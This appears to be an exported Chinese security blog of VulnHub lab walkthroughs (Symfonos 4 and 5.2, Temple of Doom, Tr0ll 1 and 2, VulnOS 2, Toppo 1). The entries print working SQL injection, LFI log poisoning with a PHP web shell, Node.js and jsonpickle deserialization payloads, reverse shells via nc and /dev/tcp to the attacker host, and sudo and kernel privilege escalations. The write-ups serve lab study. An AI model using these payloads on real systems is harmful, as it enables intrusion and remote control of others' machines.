<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">masscan -p1-65535 192.168.1.215 --rate&#x3D;1000 -e eth0 &gt; ports</span><br><span class="line">ports&#x3D;$(cat ports | awk -F &quot; &quot; &#39;&#123;print $4&#125;&#39; | awk -F &quot;&#x2F;&quot; &#39;&#123;print $1&#125;&#39; | sort -n | tr &#39;\n&#39; &#39;,&#39; | sed &#39;s&#x2F;,$&#x2F;&#x2F;&#39;)</span><br><span class="line">nmap -Pn -sV -sC -p$ports 192.168.1.215 -oN nmap</span><br></pre></td></tr></table></figure>
<p><img src="/images/Symfonos-4/1.png" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>只有80端口，进行目录枚举，并选中php扩展名</p>
<p><img src="/images/Symfonos-4/2.png" alt="2"></p>
<p>发现了gods，里面有一些日志，但是没有有趣的信息<br>发现了atlantis.php，一个登陆页面，直接尝试sql注入</p>
<p><img src="/images/Symfonos-4/3.png" alt="3"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; or 1&#x3D;1#</span><br></pre></td></tr></table></figure>

<p>直接绕过了登录</p>
<p><img src="/images/Symfonos-4/5.png" alt="5"></p>
<p>之后到了一个这样的页面，选中之后会发生一些奇怪的现象，页面的内容与gods目录下的一致，看来参数file有些问题</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>初步估计是一个LFI漏洞，并伴随<code>.log</code>扩展名<br>尝试包含/var/log/dpkg.log失败，后来发现，这个文件竟然是空的</p>
<p>想要进行日志投毒，发现之前发现的22端口，尝试投毒ssh的日志/var/log/auth.log</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh &#39;&lt;?php phpinfo();system($_GET[&#39;cmd&#39;]); ?&gt;&#39;@192.168.1.215</span><br></pre></td></tr></table></figure>

<p><img src="/images/Symfonos-4/6.png" alt="6"></p>
<p>接着LFI包含</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.1.215&#x2F;sea.php?file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;log&#x2F;auth</span><br></pre></td></tr></table></figure>

<p><img src="/images/Symfonos-4/7.png" alt="7"></p>
<p>成功被解析，这样我们就能够反弹shell了</p>
<p><img src="/images/Symfonos-4/8.png" alt="8"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>linpeas扫描</p>
<p>发现了奇怪的目录</p>
<p><img src="/images/Symfonos-4/14.png" alt="14"></p>
<p>检查改目录下的文件，只有读权限</p>
<p><img src="/images/Symfonos-4/13.png" alt="13"></p>
<p>发现了root开放的端口</p>
<p><img src="/images/Symfonos-4/9.png" alt="9"></p>
<p>外部无法访问，进行远程端口转发</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh -R 9999:127.0.0.1:8080 root@192.168.1.201</span><br></pre></td></tr></table></figure>

<p>接着访问本地</p>
<p><img src="/images/Symfonos-4/10.png" alt="10"></p>
<p>发现了一段奇怪的cookie，将其base64解码</p>
<p><img src="/images/Symfonos-4/11.png" alt="11"></p>
<p>看起来是json pickle的反序列化利用，可以寻找到一些帮助(<a href="https://versprite.com/blog/application-security/into-the-jar-jsonpickle-exploitation/?__cf_chl_captcha_tk__=241e2009de991b5ef1f1f40662ca46ed65b10648-1600455962-0-AdaCqDDsUBTI2UhZh1pkqF1dc_VslfEn-f21ct-IAZMXR5ItUSLH73MCXTHZmV1erktFSLAo7MU6NOh0YPbFdmK-AB-A1IaSYM5qyiRcKXezSiRIf7jyET2usqGNH34kwbm1gltvIty-T5JvAOvcpjNXjb-LQ1XMPTwrure3s2EBK9-jqEbk2ULvJNsgycIWOCZ7zefUq2byb8WO6ZPdnyRhaBvyL0vf4uoPMXi-eKL8JnAaPkkNgEglc22yqEojsuLhUI-HTIWS6OWOuJeYR1ONTNS02Vck9cuKQLU2t_JJ4yu8Oz4ALiZY8iXcsPGjw-tpf0QyeYKgAC-OXlYJ68BhP8yDMx8igcF2_uJX3ShKtUNJxosDglWTf4XAnKaTuPVfgRV32O6dspqe-Cb-uT08FpWnwR4rd3R34CazVBvrIPLe5kplVQzblKJIa-MVNPPYTXjKejuTi6nRo8AOyMv1GVy8ZN6Ra9lAFr6-oeYn5JCxOaGh9cM7A9DHTeZJLQQBk1rPe1XJd0nXOTCRnB_9Ov4aKoUpylyZBGrh2S1AzC0-6rs-0up4Tn35GXFFdw">链接</a>)</p>
<p>将payload进行base64编码后发过去，我们就能获得一个shell了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;py&#x2F;object&quot;:&quot;__main__.Shell&quot;,&quot;py&#x2F;reduce&quot;:[&#123;&quot;py&#x2F;function&quot;:&quot;os.system&quot;&#125;,[&quot;&#x2F;usr&#x2F;bin&#x2F;nc -e &#x2F;bin&#x2F;sh 192.168.1.201 4444&quot;], 0, 0, 0]&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Symfonos-4/12.png" alt="12"></p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场Temple of Doom</title>
    <url>/2020/09/15/%E9%9D%B6%E5%9C%BATemple-of-Doom/</url>
    <content><![CDATA[<h1 id="Temple-of-Doom"><a href="#Temple-of-Doom" class="headerlink" title="Temple of Doom"></a>Temple of Doom</h1><p>kali:192.168.1.201<br>目标:192.168.1.229</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">masscan -p1-65535 192.168.1.229 --rate&#x3D;1000 -e eth0 &gt; ports</span><br><span class="line">ports&#x3D;$(cat ports | awk -F &quot; &quot; &#39;&#123;print $4&#125;&#39; | awk -F &quot;&#x2F;&quot; &#39;&#123;print $1&#125;&#39; | sort -n | tr &#39;\n&#39; &#39;,&#39; | sed &#39;s&#x2F;,$&#x2F;&#x2F;&#39;)</span><br><span class="line">nmap -Pn -sV -sC -p$ports 192.168.1.229 -oN nmap</span><br></pre></td></tr></table></figure>

<p><img src="/images/TempleofDoom/1.png" alt="1"></p>
<p>发现http端口666，并且使用了Node.js</p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>dirbuster枚举，什么都没发现</p>
<p>但在主页有一些发现</p>
<p>第一次访问</p>
<p><img src="/images/TempleofDoom/2.png" alt="2"></p>
<p>之后再次访问</p>
<p><img src="/images/TempleofDoom/3.png" alt="3"></p>
<p>发现后端使用JSON，比较两次请求的差异</p>
<p>主要是第一次请求后，它给我设置了一个cookie，第二次请求携带了这段cookie</p>
<p><img src="/images/TempleofDoom/4.png" alt="4"></p>
<p>末尾看到%3D，这是一个常见的URL编码(等号)，我们先进行URL解码，再base64</p>
<p><img src="/images/TempleofDoom/5.png" alt="5"></p>
<p>一段序列化数据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;Admin&quot;,&quot;csrftoken&quot;:&quot;u32t4o3tb3gg431fs34ggdgchjwnza0l&#x3D;&quot;,&quot;Expires&#x3D;&quot;:Friday, 13 Oct 2018 00:00:00 GMT&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>我们可以发现它出现的语法错误，Expires的值少个分号</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;Admin&quot;,&quot;csrftoken&quot;:&quot;u32t4o3tb3gg431fs34ggdgchjwnza0l&#x3D;&quot;,&quot;Expires&#x3D;&quot;:&quot;Friday, 13 Oct 2018 00:00:00 GMT&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>修复后，进行base64编码，再URL编码给发送过去</p>
<p><img src="/images/TempleofDoom/6.png" alt="6"></p>
<p>看来是个Node.js的unserialize漏洞</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>谷歌搜索Node.js 反序列化漏洞，你就可以找到很多的PoC</p>
<p>ls-l</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;_$$ND_FUNC$$_function()&#123;return require(&#39;child_process&#39;).execSync(&#39;ls -l &#x2F;&#39;,(e,out,err)&#x3D;&gt;&#123;console.log(out);&#125;); &#125;()&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>对其base64，再URL编码发送过去</p>
<p><img src="/images/TempleofDoom/7.png" alt="7"></p>
<p>whoami</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;_$$ND_FUNC$$_function()&#123;return require(&#39;child_process&#39;).execSync(&#39;whoami&#39;,(e,out,err)&#x3D;&gt;&#123;console.log(out);&#125;); &#125;()&quot;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/images/TempleofDoom/8.png" alt="8"></p>
<p>成功获得了RCE<br>直接反弹shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;_$$ND_FUNC$$_function()&#123;return require(&#39;child_process&#39;).execSync(&#39;rm -rf &#x2F;tmp&#x2F;f;mknod &#x2F;tmp&#x2F;f p;&#x2F;bin&#x2F;sh 0&lt;&#x2F;tmp&#x2F;f | nc 192.168.1.201 443 1&gt;&#x2F;tmp&#x2F;f&#39;,(e,out,err)&#x3D;&gt;&#123;console.log(out);&#125;); &#125;()&quot;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/images/TempleofDoom/9.png" alt="9"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>提权有点小隐蔽</p>
<p><img src="/images/TempleofDoom/10.png" alt="10"></p>
<p>可以发现fireman在运行ss-manager，这是一个不可描述的软件，俗称小飞机</p>
<p><img src="/images/TempleofDoom/11.png" alt="11"></p>
<p>我们可以找到它也会受到json注入攻击，payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -u 127.0.0.1 8839</span><br><span class="line">add: &#123;&quot;server_port&quot;:8003, &quot;password&quot;:&quot;test&quot;, &quot;method&quot;:&quot;||&#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.1.201&#x2F;4444  0&gt;&amp;1||&quot;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/images/TempleofDoom/12.png" alt="12"></p>
<p>接下来的提权就很显眼了</p>
<p><img src="/images/TempleofDoom/13.png" alt="13"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &#39;nc -nv 192.168.1.201 8080 -e &#x2F;bin&#x2F;bash&#39; &gt; evil</span><br><span class="line">sudo tcpdump -ln -i eth0 -w &#x2F;dev&#x2F;null -W 1 -G 1 -z &#x2F;tmp&#x2F;evil -Z root</span><br></pre></td></tr></table></figure>

<p><img src="/images/TempleofDoom/14.png" alt="14"></p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场Symfonos 5.2</title>
    <url>/2020/09/18/%E9%9D%B6%E5%9C%BASymfonos-5-2/</url>
    <content><![CDATA[<h1 id="靶场Symfonos-5-2"><a href="#靶场Symfonos-5-2" class="headerlink" title="靶场Symfonos 5.2"></a>靶场Symfonos 5.2</h1><p>kali:192.168.1.201<br>目标:192.168.1.206</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">masscan -p1-65535 192.168.1.206 --rate&#x3D;1000 -e eth0 &gt; ports</span><br><span class="line">ports&#x3D;$(cat ports | awk -F &quot; &quot; &#39;&#123;print $4&#125;&#39; | awk -F &quot;&#x2F;&quot; &#39;&#123;print $1&#125;&#39; | sort -n | tr &#39;\n&#39; &#39;,&#39; | sed &#39;s&#x2F;,$&#x2F;&#x2F;&#39;)</span><br><span class="line">nmap -Pn -sV -sC -p$ports 192.168.1.206 -oN nmap</span><br></pre></td></tr></table></figure>
<p><img src="/images/Symfonos-5-2/1.png" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>尝试直接进行ldap枚举，失败</p>
<p>对80端口进行枚举，选中php扩展</p>
<p><img src="/images/Symfonos-5-2/2.png" alt="2"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>发现登录页面</p>
<p><img src="/images/Symfonos-5-2/3.png" alt="3"></p>
<p>进行常规sql注入，失败<br>考虑到之前扫描发现了389端口，这里尝试使用LDAP注入</p>
<p>但我缺乏这个注入的知识，只能找个投机取巧的方法，PayloadsAllTheThings的fuzz字典，<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/LDAP%20Injection/Intruder/LDAP_FUZZ.txt">链接</a></p>
<p><img src="/images/Symfonos-5-2/4.png" alt="4"></p>
<p>之后你就可以发现一些不同的请求<br>重放这个包</p>
<p><img src="/images/Symfonos-5-2/5.png" alt="5"></p>
<p>发现302跳转</p>
<p><img src="/images/Symfonos-5-2/6.png" alt="6"></p>
<p>发现了home.php携带的url参数</p>
<p>看样子是一个RFI漏洞，我们可以尝试包含</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;home.php?url&#x3D;http:&#x2F;&#x2F;192.168.1.201&#x2F;a</span><br></pre></td></tr></table></figure>

<p><img src="/images/Symfonos-5-2/7.png" alt="7"></p>
<p>可以发现请求成功了，查看请求</p>
<p><img src="/images/Symfonos-5-2/8.png" alt="8"></p>
<p>没有被解释，不好的消息，看来无法直接通过RFI来获取shell<br>尝试读取一些本地文件</p>
<p><img src="/images/Symfonos-5-2/9.png" alt="9"></p>
<p>通过/etc/passwd，并没有能够发现一些有趣的用户<br>尝试读取刚刚的验证页面，admin.php的源码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.1.206&#x2F;home.php?url&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;admin.php</span><br></pre></td></tr></table></figure>

<p>base64解码后，读取源码</p>
<p><img src="/images/Symfonos-5-2/10.png" alt="10"></p>
<p>通过这个操作，竟然成功发现了存在其中的ldap凭据，利用它我们可以进行ldap的枚举<br>再去查看一下home.php的源码，看看为什么RFI不能利用</p>
<p><img src="/images/Symfonos-5-2/11.png" alt="11"></p>
<p>原来只有file_get_contents，所以只能读文件<br>接着利用ladp的凭证进行枚举</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -p 389 --script ldap-search --script-args &#39;ldap.username&#x3D;&quot;cn&#x3D;admin,dc&#x3D;symfonos,dc&#x3D;local&quot;, ldap.password&#x3D;&quot;qMDdyZh3cT6eeAWD&quot;&#39; 192.168.1.206</span><br></pre></td></tr></table></figure>

<p><img src="/images/Symfonos-5-2/12.png" alt="12"></p>
<p>通过这个，我们发现了zeus账户的密码，直接尝试ssh</p>
<p><img src="/images/Symfonos-5-2/13.png" alt="13"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>linpeas</p>
<p><img src="/images/Symfonos-5-2/14.png" alt="14"></p>
<p>发现sudo存在dpkg命令，直接进行提权</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo dpkg -l</span><br><span class="line">!&#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure>

<p><img src="/images/Symfonos-5-2/15.png" alt="15"></p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场Toppo 1</title>
    <url>/2020/09/22/%E9%9D%B6%E5%9C%BAToppo-1/</url>
    <content><![CDATA[<h1 id="Toppo-1"><a href="#Toppo-1" class="headerlink" title="Toppo 1"></a>Toppo 1</h1><p>kali:192.168.1.201<br>目标:192.168.1.222</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Toppo-1/1.png" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p><img src="/images/Toppo-1/2.png" alt="2"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>发现了隐藏文件</p>
<p><img src="/images/Toppo-1/3.png" alt="3"></p>
<p>可以猜测，登录凭据为ted/12345ted123</p>
<p><img src="/images/Toppo-1/4.png" alt="4"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="/images/Toppo-1/6.png" alt="6"></p>
<p>SUID提权</p>
<p><img src="/images/Toppo-1/5.png" alt="5"></p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场Tr0ll 1</title>
    <url>/2020/09/17/%E9%9D%B6%E5%9C%BATr0ll-1/</url>
    <content><![CDATA[<h1 id="Tr0ll-1"><a href="#Tr0ll-1" class="headerlink" title="Tr0ll 1"></a>Tr0ll 1</h1><p>kali:192.168.1.201<br>目标:192.168.1.243</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">masscan -p1-65535 192.168.1.243 --rate&#x3D;1000 -e eth0 &gt; ports</span><br><span class="line">ports&#x3D;$(cat ports | awk -F &quot; &quot; &#39;&#123;print $4&#125;&#39; | awk -F &quot;&#x2F;&quot; &#39;&#123;print $1&#125;&#39; | sort -n | tr &#39;\n&#39; &#39;,&#39; | sed &#39;s&#x2F;,$&#x2F;&#x2F;&#39;)</span><br><span class="line">nmap -Pn -sV -sC -p$ports 192.168.1.243 -oN nmap</span><br></pre></td></tr></table></figure>

<p><img src="/images/Tr0ll-1/1.png" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>21允许匿名登录，查看</p>
<p><img src="/images/Tr0ll-1/2.png" alt="2"></p>
<p>wireshark查看它</p>
<p><img src="/images/Tr0ll-1/3.png" alt="3"></p>
<p>进一步检查</p>
<p><img src="/images/Tr0ll-1/4.png" alt="4"></p>
<p>得到了<code>sup3rs3cr3tdirlol</code></p>
<p>80端口访问</p>
<p><img src="/images/Tr0ll-1/5.png" alt="5"></p>
<p>简单查看</p>
<p><img src="/images/Tr0ll-1/6.png" alt="6"></p>
<p>80再次访问</p>
<p><img src="/images/Tr0ll-1/7.png" alt="7"></p>
<p>得到两个字典</p>
<p>尝试ssh登录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh overflow@192.168.1.243</span><br><span class="line">Pass.txt</span><br></pre></td></tr></table></figure>

<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#39;&#x2F;bin&#x2F;bash&#39;)&quot;</span><br></pre></td></tr></table></figure>

<h3 id="方法1-定时任务"><a href="#方法1-定时任务" class="headerlink" title="方法1 定时任务"></a>方法1 定时任务</h3><p>可以用pspy检测</p>
<p><img src="/images/Tr0ll-1/8.png" alt="8"></p>
<p>这里并没有/etc/crontab里发现，但在/var/log里发现了一个日志</p>
<p><img src="/images/Tr0ll-1/9.png" alt="9"></p>
<p>而<code>/lib/log/cleaner.py</code>我们也可以写，直接给你整一个os执行的反弹shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line">import os</span><br><span class="line">import sys</span><br><span class="line">try:</span><br><span class="line">        os.system(&#39;rm -rf &#x2F;tmp&#x2F;f;mknod &#x2F;tmp&#x2F;f p;&#x2F;bin&#x2F;sh 0&lt;&#x2F;tmp&#x2F;f | nc 192.168.1.201 443 1&gt;&#x2F;tmp&#x2F;f&#39;)</span><br><span class="line">except:</span><br><span class="line">        sys.exit() </span><br></pre></td></tr></table></figure>

<p><img src="/images/Tr0ll-1/10.png" alt="10"></p>
<p>成功</p>
<p><img src="/images/Tr0ll-1/11.png" alt="11"></p>
<h3 id="方法2-内核提权"><a href="#方法2-内核提权" class="headerlink" title="方法2 内核提权"></a>方法2 内核提权</h3><p>之前碰到过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">overflow@troll:&#x2F;$ cat &#x2F;etc&#x2F;issue</span><br><span class="line">Ubuntu 14.04.1 LTS \n \l</span><br><span class="line"></span><br><span class="line">overflow@troll:&#x2F;$ uname -r</span><br><span class="line">3.13.0-32-generic</span><br></pre></td></tr></table></figure>

<p>37292.c</p>
<p><img src="/images/Tr0ll-1/12.png" alt="12"></p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场Tr0ll 2</title>
    <url>/2020/09/17/%E9%9D%B6%E5%9C%BATr0ll-2/</url>
    <content><![CDATA[<h1 id="Tr0ll-2"><a href="#Tr0ll-2" class="headerlink" title="Tr0ll 2"></a>Tr0ll 2</h1><p>kali:192.168.1.201<br>目标:192.168.1.222</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">masscan -p1-65535 192.168.1.222 --rate&#x3D;1000 -e eth0 &gt; ports</span><br><span class="line">ports&#x3D;$(cat ports | awk -F &quot; &quot; &#39;&#123;print $4&#125;&#39; | awk -F &quot;&#x2F;&quot; &#39;&#123;print $1&#125;&#39; | sort -n | tr &#39;\n&#39; &#39;,&#39; | sed &#39;s&#x2F;,$&#x2F;&#x2F;&#39;)</span><br><span class="line">nmap -Pn -sV -sC -p$ports 192.168.1.222 -oN nmap</span><br></pre></td></tr></table></figure>
<p><img src="/images/Tr0ll-2/1.png" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>21不允许匿名登录<br>查看80，首页发现信息</p>
<p><img src="/images/Tr0ll-2/2.png" alt="2"></p>
<p>利用该账号登录ftp，下载文件，不过存在密码</p>
<p><img src="/images/Tr0ll-2/3.png" alt="3"></p>
<p>nikto扫描80，发现robots.txt</p>
<p><img src="/images/Tr0ll-2/4.png" alt="4"></p>
<p>逐个访问，发现一张图片和一个提示</p>
<p><img src="/images/Tr0ll-2/5.png" alt="5"></p>
<p>这里没有隐写，直接strings就可以发现</p>
<p><img src="/images/Tr0ll-2/6.png" alt="6"></p>
<p>访问这个目录</p>
<p><img src="/images/Tr0ll-2/7.png" alt="7"></p>
<p>得到很多base64，尝试解密</p>
<p><img src="/images/Tr0ll-2/8.png" alt="8"></p>
<p>得到了一个字典，利用该字典爆破zip</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fcrackzip -D -p decode -u lmao.zip</span><br></pre></td></tr></table></figure>

<p><img src="/images/Tr0ll-2/9.png" alt="9"></p>
<p>解压后得到RSA密钥</p>
<p><img src="/images/Tr0ll-2/10.png" alt="10"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>尝试登录</p>
<p><img src="/images/Tr0ll-2/11.png" alt="11"></p>
<p>失败</p>
<p>尝试ssh的shellshock  exploit(利用方法<code>() &#123; :; &#125;; /bin/bash</code>)<br>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh -i noob noob@192.168.1.222 -t &quot;() &#123; :; &#125;; &#x2F;bin&#x2F;bash&quot;</span><br></pre></td></tr></table></figure>

<p>成功破壳</p>
<p><img src="/images/Tr0ll-2/12.png" alt="12"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>内核提权</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">noob@Tr0ll2:~$ uname -m</span><br><span class="line">i686</span><br><span class="line">noob@Tr0ll2:~$ uname -r</span><br><span class="line">3.2.0-29-generic-pae</span><br></pre></td></tr></table></figure>

<p>40839.c</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -pthread 40839.c -o dirty -lcrypt</span><br></pre></td></tr></table></figure>

<p><img src="/images/Tr0ll-2/13.png" alt="13"></p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场VulnOS 2</title>
    <url>/2020/09/13/%E9%9D%B6%E5%9C%BAVulnOS-2/</url>
    <content><![CDATA[<h1 id="VulnOS2"><a href="#VulnOS2" class="headerlink" title="VulnOS2"></a>VulnOS2</h1><p>kali:192.168.1.201</p>
<p>目标:192.168.1.249</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">masscan -p1-65535 192.168.1.249 --rate&#x3D;1000 -e eth0 &gt; ports</span><br><span class="line">ports&#x3D;$(cat ports | awk -F &quot; &quot; &#39;&#123;print $4&#125;&#39; | awk -F &quot;&#x2F;&quot; &#39;&#123;print $1&#125;&#39; | sort -n | tr &#39;\n&#39; &#39;,&#39; | sed &#39;s&#x2F;,$&#x2F;&#x2F;&#39;)</span><br><span class="line">nmap -Pn -sV -sC -p$ports 192.168.1.249 -oN nmap</span><br></pre></td></tr></table></figure>

<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>枚举web服务</p>
<p>看图标，应该运行着drupal</p>
<p><img src="/images/VulnOS-2/2.png" alt="2"></p>
<p>信息枚举</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">droopescan scan drupal -u http:&#x2F;&#x2F;192.168.1.249&#x2F;jabc&#x2F; -t 32</span><br></pre></td></tr></table></figure>

<p><img src="/images/VulnOS-2/3.png" alt="3"></p>
<p>枚举出了信息，手动检查</p>
<p><img src="/images/VulnOS-2/4.png" alt="4"></p>
<p>发现了另一个目录/jabcd0cs/</p>
<p><img src="/images/VulnOS-2/5.png" alt="5"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>直接搜索漏洞</p>
<p><img src="/images/VulnOS-2/6.png" alt="6"></p>
<p><img src="/images/VulnOS-2/7.png" alt="7"></p>
<p>根据文档直接找到一处sql注入</p>
<p>爆出数据库</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jabcd0cs</span><br></pre></td></tr></table></figure>

<p>爆表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">odm_user UNION SELECT 1,TABLE_NAME,3,4,5,6,7,8,9 from information_schema.TABLES </span><br></pre></td></tr></table></figure>

<p>爆字段</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">odm_user UNION SELECT 1,column_name,3,4,5,6,7,8,9 from information_schema.columns </span><br></pre></td></tr></table></figure>

<p>爆出数据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">odm_user UNION SELECT 1,password,3,4,5,6,7,8,9 from odm_user</span><br></pre></td></tr></table></figure>

<p><img src="/images/VulnOS-2/8.png" alt="8"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">odm_user UNION SELECT 1,username,3,4,5,6,7,8,9 from odm_user</span><br></pre></td></tr></table></figure>

<p><img src="/images/VulnOS-2/9.png" alt="9"></p>
<p>解密得到</p>
<p><code>webmin/webmin1980</code></p>
<p>可以直接ssh登录</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="/images/VulnOS-2/10.png" alt="10"></p>
<p>内核提权37292.c</p>
<p><img src="/images/VulnOS-2/11.png" alt="11"></p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场Web Developer 1</title>
    <url>/2020/09/17/%E9%9D%B6%E5%9C%BAWeb-Developer-1/</url>
    <content><![CDATA[<h1 id="Web-Developer-1"><a href="#Web-Developer-1" class="headerlink" title="Web Developer 1"></a>Web Developer 1</h1><p>kali:192.168.1.201<br>目标:192.168.1.244</p>
